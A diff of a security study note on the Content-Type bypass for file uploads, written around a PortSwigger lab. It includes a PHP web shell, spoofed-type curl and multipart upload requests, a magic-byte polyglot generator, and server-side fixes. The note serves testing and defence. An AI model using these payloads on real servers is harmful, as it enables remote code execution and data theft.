@@ -8,198 +8,119 @@ portswigger_labs: ["Web shell upload via Content-Type restriction bypass"]
 
 # 22.03 — Content-Type Bypass
 
-## How Content-Type Validation Works
+## What is it?
+When a browser uploads a file to a web server via a multipart form, it automatically includes a `Content-Type` header for that specific file part based on its extension (e.g., `image/jpeg` for `.jpg` files). 
 
+Many web applications mistakenly use this client-provided `Content-Type` header to validate whether the uploaded file is safe. Since all HTTP request headers are fully controlled by the client, an attacker can simply upload a dangerous file (like `shell.php`), but manually change the `Content-Type` header in the upload request to a safe value (like `image/jpeg`). If the server strictly trusts this header, it will accept the malicious PHP file and save it to the server.
+
+Think of it like an airport security guard who, instead of putting your bag through an X-ray scanner, just asks you, "What's in the bag?" and accepts your answer without actually checking inside.
+
+## ASCII Diagram
+```text
+[Attacker]
+   │
+   │ 1. Intercepts upload request for "shell.php"
+   │ 2. Modifies request header:
+   │    Filename: shell.php
+   │    Content-Type: image/jpeg  (Spoofed!)
+   ▼
+[Web Application Validator]
+   │
+   │ 3. Reads $_FILES['file']['type']
+   │ 4. "Is it image/jpeg?" -> YES!
+   ▼
+[File System] ─── 5. Saves file as: /uploads/shell.php
+   │
+[Attacker] ────── 6. Requests GET /uploads/shell.php -> RCE!
 ```
-CONTENT-TYPE HEADER IN UPLOAD:
-  Multipart upload request includes Content-Type for each part:
-  
-  POST /upload HTTP/1.1
-  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
-  
-  ------WebKitFormBoundary
-  Content-Disposition: form-data; name="file"; filename="shell.php"
-  Content-Type: image/jpeg    ← THE HEADER THAT VALIDATES
-  
-  <?php system($_GET['cmd']); ?>
-  ------WebKitFormBoundary--
 
-VULNERABLE SERVER-SIDE CHECK:
-  $content_type = $_FILES['file']['type'];  // From request header!
-  if ($content_type != 'image/jpeg' && $content_type != 'image/png'):
-      die("Only images allowed!")
-  
-  PROBLEM: $_FILES['file']['type'] is set from the CLIENT-SUPPLIED header!
-  → Browser (or Burp) can set any Content-Type!
-  → Change Content-Type: application/php → image/jpeg → bypass!
-```
+## How to Find It
+- **Manual steps:**
+  1. Identify a file upload endpoint that only accepts certain file types (e.g., images).
+  2. Attempt to upload a `.php` file. If the application blocks it, note the error message.
+  3. Send the request to Burp Suite Repeater.
+  4. Find the `Content-Type` declaration inside the multipart boundary for your file (it will likely say `application/x-php` or `application/octet-stream`).
+  5. Change that value to a permitted MIME type like `image/jpeg` or `image/png`.
+  6. Send the modified request. If it succeeds and you can access your `.php` file, the server is vulnerable.
 
----
+- **Tool commands with flags explained:**
+  Using `curl` to manually specify the MIME type during upload:
+  ```bash
+  # The "type=image/jpeg" forces curl to spoof the Content-Type header
+  curl -X POST https://target.com/api/upload \
+    -F "avatar=@shell.php;type=image/jpeg"
+  ```
 
-## The Bypass
+## How to Exploit It
+- **Step-by-step walkthrough:**
+  1. Prepare your malicious payload (e.g., `shell.php`).
+  2. Intercept the normal upload request.
+  3. Ensure the `filename` remains `shell.php` so the server saves it with an executable extension.
+  4. Spoof the `Content-Type` to match whatever the server expects (e.g., `image/png`, `application/pdf`).
+  5. Submit the request.
+  6. Navigate to the uploaded `shell.php` to execute the code.
 
-```
-ORIGINAL REQUEST (browser sends):
-  Content-Disposition: form-data; name="file"; filename="shell.php"
-  Content-Type: application/x-php
-  
-  <?php system($_GET['cmd']); ?>
-
-MODIFIED REQUEST (in Burp → forward):
-  Content-Disposition: form-data; name="file"; filename="shell.php"
-  Content-Type: image/jpeg    ← CHANGED!
-  
-  <?php system($_GET['cmd']); ?>
-
-SERVER CHECKS: Content-Type == image/jpeg → YES → ALLOWED!
-But: File content is still PHP!
-Server saves as shell.php → PHP executed when visited!
-
-COMMON CONTENT-TYPE VALUES TO USE:
+- **Actual payloads:**
+  **Common Spoofed MIME Types:**
+  ```text
   image/jpeg
   image/png
   image/gif
-  image/webp
-  image/bmp
-  text/plain (if text allowed)
-```
+  application/pdf
+  text/csv
+  ```
 
----
+- **Real HTTP request/response examples:**
+  **Upload Request (Intercepted & Modified in Burp):**
+  ```http
+  POST /upload HTTP/1.1
+  Host: target.com
+  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 
-## Testing Content-Type Bypass
+  ------WebKitFormBoundary
+  Content-Disposition: form-data; name="profile_pic"; filename="shell.php"
+  Content-Type: image/jpeg 
 
-```bash
-# STEP 1: INTERCEPT UPLOAD IN BURP
+  <?php system($_GET['cmd']); ?>
+  ------WebKitFormBoundary--
+  ```
+  *(Notice the `filename="shell.php"` but the `Content-Type: image/jpeg`)*
 
-# STEP 2: ORIGINAL REQUEST LOOKS LIKE:
-# Content-Disposition: form-data; name="file"; filename="shell.php"
-# Content-Type: application/x-php
-
-# STEP 3: MODIFY IN BURP REPEATER:
-# Change the Content-Type part (within multipart body):
-# Content-Type: image/jpeg
-
-# KEEPING FILENAME AS shell.php!
-
-# STEP 4: FORWARD → CHECK RESPONSE
-
-# MANUAL CURL TEST:
-curl -X POST https://target.com/upload \
-  -b "session=YOUR_SESSION" \
-  -F "file=@shell.php;type=image/jpeg"  # ← override Content-Type!
-# The ";type=image/jpeg" in -F changes the Content-Type sent!
-
-# ALTERNATIVE CURL:
-# Create fake JPEG with PHP content:
-python3 -c "
-import sys
-# Write PHP webshell:
-content = b'<?php system(\$_GET[\"cmd\"]); ?>'
-# But with JPEG magic bytes at start:
-# (Some checks look at file content, not just Content-Type)
-magic = b'\xff\xd8\xff\xe0'  # JPEG magic bytes
-sys.stdout.buffer.write(magic + content)
-" > shell_with_magic.php
-
-curl -X POST https://target.com/upload \
-  -b "session=YOUR_SESSION" \
-  -F "file=@shell_with_magic.php;type=image/jpeg"
-```
-
----
-
-## Double-Checking: What Does Server Validate?
-
-```
-DIFFERENT VALIDATION LEVELS:
-
-LEVEL 1 (WEAKEST): Trust client Content-Type header
-  → Bypass: just change Content-Type to image/jpeg
+  **Server Response:**
+  ```http
+  HTTP/1.1 200 OK
   
-LEVEL 2: Check file extension
-  → Bypass: see note 04 (extension bypasses)
+  {"status": "success", "path": "/uploads/shell.php"}
+  ```
+
+## Real-World Example
+In a classic PortSwigger Academy lab, the application allows users to update their avatars but enforces a rule that the uploaded file must be an image. The application performs this check by evaluating the `Content-Type` provided in the HTTP request. By uploading a basic PHP webshell (`<?php echo file_get_contents('/home/carlos/secret'); ?>`), intercepting the request in Burp Suite, and changing the `Content-Type` from `application/x-php` to `image/jpeg`, the server accepted the file. When the user navigated to their newly uploaded avatar, the PHP code executed, revealing the secret file contents.
+
+## How to Fix It
+- **Developer remediation:**
+  Never trust any data supplied by the client, including HTTP headers like `Content-Type`. To securely validate a file's type, you must inspect the actual contents of the file on the server side using reliable libraries (like checking the magic bytes). For images, the most robust defense is to pass the uploaded file through an image processing library (like Python's Pillow or PHP's Imagick) to decode and re-encode the image, stripping away any malicious payloads.
+
+- **Code snippet:**
+  **PHP (Secure Validation using `finfo`):**
+  ```php
+  // DO NOT USE: $type = $_FILES['file']['type']; // This is the vulnerable client header!
   
-LEVEL 3: Check file magic bytes (first bytes of file)
-  → Bypass: see note 12 (magic bytes bypass)
-  
-LEVEL 4 (CORRECT): Validate content through proper image library
-  → E.g., use Python Pillow: Image.open(file_data)
-  → If it throws → not a real image!
-  → If it succeeds AND resize/save as PNG → safe!
-
-TEST WHICH LEVEL:
-  Test 1: Upload .php with Content-Type: image/jpeg → SUCCESS? → Level 1 only!
-  Test 2: Upload .php.jpg with PHP content → SUCCESS? → Level 1-2 only
-  Test 3: Add JPEG magic bytes to PHP file → SUCCESS? → Level 1-3 only
-```
-
----
-
-## Chaining with Extension Bypass
-
-```
-COMBINE CONTENT-TYPE + EXTENSION:
-
-If server checks: Content-Type must be image/* AND extension must be .jpg:
-  Upload: shell.php.jpg (extension .jpg = OK)
-  With:   Content-Type: image/jpeg (content-type = OK)
-  Content: <?php system($_GET['cmd']); ?>
-  
-  IF: server saves as .php.jpg and Apache is configured to execute .php.jpg as PHP:
-  → Still RCE!
-  
-  IF: server saves as .jpg but executes PHP (AddHandler misconfiguration):
-  → RCE!
-  
-  (Cover more extension details in note 05)
-```
-
----
-
-## Fix
-
-```
-CORRECT CONTENT-TYPE VALIDATION:
-
-NEVER TRUST CLIENT-SUPPLIED Content-Type:
-  # BAD (PHP):
-  $type = $_FILES['file']['type'];  # from request!
-  if ($type == 'image/jpeg') { ... }
-  
-  # BETTER: Use finfo to check actual file content:
+  // USE PHP's Fileinfo extension to check the actual file contents:
   $finfo = new finfo(FILEINFO_MIME_TYPE);
   $detected_type = $finfo->file($_FILES['file']['tmp_name']);
-  if (!in_array($detected_type, ['image/jpeg', 'image/png', 'image/gif'])) {
-      die("Invalid file type");
-  }
   
-  # BEST: Parse as image using a library:
-  try {
-      $image = new Imagick($_FILES['file']['tmp_name']);
-      // If no exception → valid image!
-      // Re-save to strip metadata and any embedded code:
-      $image->writeImage($upload_path . '/' . $safe_filename . '.jpg');
-  } catch (Exception $e) {
-      die("Invalid image");
+  $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
+  
+  if (!in_array($detected_type, $allowed_types)) {
+      die("Invalid file content detected!");
   }
+  ```
 
-  # Python:
-  from PIL import Image
-  try:
-      img = Image.open(file_data)
-      img.verify()  # Check it's really an image
-      # Re-save:
-      img = Image.open(file_data)  # Reopen after verify
-      img.save(upload_path, 'JPEG')  # Safe re-save
-  except Exception:
-      raise ValueError("Not a valid image")
-```
-
----
+## Chaining Opportunities
+- This vuln + [[12 - Image Upload Magic Bytes Bypass]] → If the server checks *both* the `Content-Type` header AND the file's Magic Bytes, you must spoof the `Content-Type: image/jpeg` header while simultaneously injecting actual JPEG magic bytes (`FF D8 FF E0`) at the very beginning of your PHP payload.
+- This vuln + [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]] → If the server blocks `.php` but relies on `Content-Type` to enforce safe files, you must combine an alternative extension (`shell.phtml`) with a spoofed header (`Content-Type: image/png`).
 
 ## Related Notes
-- [[01 - What Makes File Upload Dangerous]] — why this matters
-- [[02 - Unrestricted File Upload — Webshell Upload]] — webshell upload
-- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]] — extension bypasses
-- [[12 - Image Upload Magic Bytes Bypass]] — magic bytes bypass
-- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
+- [[01 - What Makes File Upload Dangerous]]
+- [[02 - Unrestricted File Upload — Webshell Upload]]
+- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
